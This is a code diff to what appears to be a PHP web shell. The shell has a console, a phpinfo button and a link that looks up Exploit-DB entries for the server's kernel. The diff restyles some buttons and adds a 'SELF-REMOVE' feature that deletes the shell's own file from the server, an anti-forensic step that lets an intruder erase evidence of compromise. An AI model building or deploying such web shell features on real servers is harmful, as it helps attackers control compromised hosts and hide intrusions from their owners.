@@ -285,7 +285,7 @@
 		/* END - CONSOLE */
 
 		.button {
-			width: 25%;
+			width: 30%;
 			color: #333;
 			height: 30px;
 			font-weight: bold;
@@ -295,7 +295,7 @@
 			font-size: 14px;
 			background-color: grey;
 			text-transform: uppercase;
-			margin-bottom: 5px;
+			margin: 10px;
 			border: 1px solid #333;
 		}
 
@@ -303,6 +303,10 @@
 			background: tomato;
 		}
 
+		.selfremove:hover {
+			color: white;
+			background-color: brown;
+		}
 	</style>
 <?php
 	}
@@ -352,6 +356,7 @@
 		<div class="submenu">
 			<a class="button" href="?info">PHPINFO</a>
 			<a class="button" href="<?=ExploitDB();?>">EXPLOIT-DB</a>
+			<a class="button selfremove" href="?selfremove">SELF-REMOVE</a>
 		</div>
 	</div>
 </div>
@@ -456,6 +461,13 @@
 		}
 	}
 
+	function SelfRemove()
+	{
+		list($path) = get_included_files();
+		unlink($path);
+		ReloadPage();
+	}
+
 	function ExploitDB()
 	{
 		$kernel = explode(" ", $GLOBALS['INFO']['KERNEL'])[0];
@@ -487,6 +499,10 @@
 			if(isset($_GET['info']))
 			{
 				phpinfo();
+			}
+			else if(isset($_GET['selfremove']))
+			{
+				SelfRemove();
 			}
 			else
 			{		
